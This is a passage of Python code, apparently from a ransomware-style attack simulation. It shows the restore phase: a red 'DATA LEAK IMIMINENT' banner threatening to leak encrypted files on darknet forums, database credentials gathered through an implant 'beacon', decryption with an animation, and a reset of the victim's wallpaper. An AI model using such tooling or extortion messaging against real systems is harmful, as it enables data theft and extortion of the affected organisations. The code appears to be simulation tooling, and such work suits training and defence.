            "[dim]All encrypted files will be leaked to public darknet forums.[/dim]",
            title="[bold red]  DATA LEAK IMMINENT  [/bold red]",
            border_style="red",
            padding=(1, 4),
        ))
        _console.print()
        return {"restore_success": False}

    # Phase 2: discover DB creds, animate, decrypt
    creds = _discover_db_creds(vinzenz_beacon)
    if not creds:
        log("[-] Could not read DB credentials — database will not be restored.")
        creds = {"host": DB_HOST, "port": "5432", "dbname": "waystar",
                 "user": "waystar", "password": ""}

    creds["host"] = DB_HOST
    restore_ok = _animate_and_restore(vinzenz_beacon, creds)

    if restore_ok:
        log("[+] Phase 9: Restoration completed successfully.")
        try:
            _reset_wallpaper(vinzenz_beacon)
        except Exception as exc:
            log(f"[-] Wallpaper reset failed (non-fatal): {exc}")
    else:
        log("[-] Phase 9: Restoration completed with errors — check chainlog.")

    return {"restore_success": restore_ok}
